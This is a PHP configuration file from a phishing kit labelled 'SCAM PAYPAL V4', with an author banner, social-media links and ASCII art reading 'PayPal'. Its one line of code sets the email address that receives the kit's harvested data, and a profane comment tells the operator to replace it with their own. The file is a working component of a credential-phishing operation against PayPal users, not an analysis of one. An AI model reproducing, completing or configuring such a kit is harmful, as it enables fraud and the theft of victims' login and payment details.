<?php

/*    


              https://www.youtube.com/channel/UCpaMm6MO-mkeAfwmLxyzfYA

                              #========================#
                              #     SCAM PAYPAL V4     #
                              #         N_Vier         #
                              #  www.fb.com/Mr.Error04 #
                              #========================#

              https://www.youtube.com/channel/UCpaMm6MO-mkeAfwmLxyzfYA                              
         
                              
                $$$$$$$\                     $$$$$$$\           $$\   
                $$  __$$\                    $$  __$$\          $$ |  
                $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |  
                $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |  
                $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |  
                $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |  
                $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |  
                \__|      \_______| \____$$ |\__|      \_______|\__|  
                                   $$\   $$ |                         
                                   \$$$$$$  |                         
                                    \______/                          
*/

$Z118_EMAIL = "simonnet12am@gmail.com"; // PUT UR FUCKING E-MAIL BRO
?>
